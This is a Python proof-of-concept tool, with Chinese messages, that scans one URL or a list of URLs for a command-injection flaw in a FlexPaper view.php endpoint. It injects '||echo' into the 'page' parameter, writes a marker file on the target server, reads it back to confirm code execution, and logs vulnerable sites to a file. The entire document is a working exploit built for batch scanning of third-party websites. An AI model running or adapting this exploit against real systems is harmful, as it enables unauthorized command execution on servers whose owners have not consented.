import sys
import argparse
import requests
import urllib3
def checkVuln(url):
    vulnurl=url+'/ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&format=swf&isSplit=true&page=||echo+"09kdujzKJDLinkQTLfGzMMKDJ23HJ"+>09kdujzKJDLinkQTLfGzMMKDJ23HJ.txt'
    okurl=url+"/ipg/static/appr/lib/flexpaper/php/09kdujzKJDLinkQTLfGzMMKDJ23HJ.txt"
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36'}
    try:
        res=requests.get(vulnurl,headers=headers,timeout=5, verify=False)
        if res.status_code==200:
            if '09kdujzKJDLinkQTLfGzMMKDJ23HJ' in requests.get(okurl,headers=headers,timeout=10,verify=False).text:
                print(f"[+]当前网址存在漏洞:{url}")
                with open("vul1.txt","a+") as f:
                    f.write(okurl+"\n")
            else:
                print("[-]当前网站不存在漏洞")
        else:
            print("[-]当前网站不存在漏洞")
    except Exception as e:
        print("[-]当前网站存在连接问题")
def batchCheck(filename):
    with open(filename,"r") as f:
        for readline in f.readlines():
            url=readline.replace('\n','')
            checkVuln(url)
def banner():
    bannerinfo='''_________ _______  _______  _        _______  _______  _______
\__   __/(  ___  )(  ___  )( \      (  ____ )(  ___  )(  ____ \
   ) (   | (   ) || (   ) || (      | (    )|| (   ) || (    \/
   | |   | |   | || |   | || |      | (____)|| |   | || |
   | |   | |   | || |   | || |      |  _____)| |   | || |
   | |   | |   | || |   | || |      | (      | |   | || |
   | |   | (___) || (___) || (____/\| )      | (___) || (____/\
   )_(   (_______)(_______)(_______/|/       (_______)(_______/


'''
    print(bannerinfo)
    print("toolpoc".center(50,'*'))
    print(f"[+]{sys.argv[0]} --url http://www.xxx.com 进行单个url漏洞检测")
    print(f"[+]{sys.argv[0]} --file targeturl.txt 对文本中的url进行批量检测")
    print(f"[+]{sys.argv[0]} --help 查看帮助")
def main():
    parser=argparse.ArgumentParser(description='漏洞检测脚本')
    parser.add_argument('-u','--url',type=str,help='单个url')
    parser.add_argument('-f','--file',type=str,help='批量检测url')
    args=parser.parse_args()
    if args.url:
        checkVuln(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()
if __name__ == '__main__':
    main()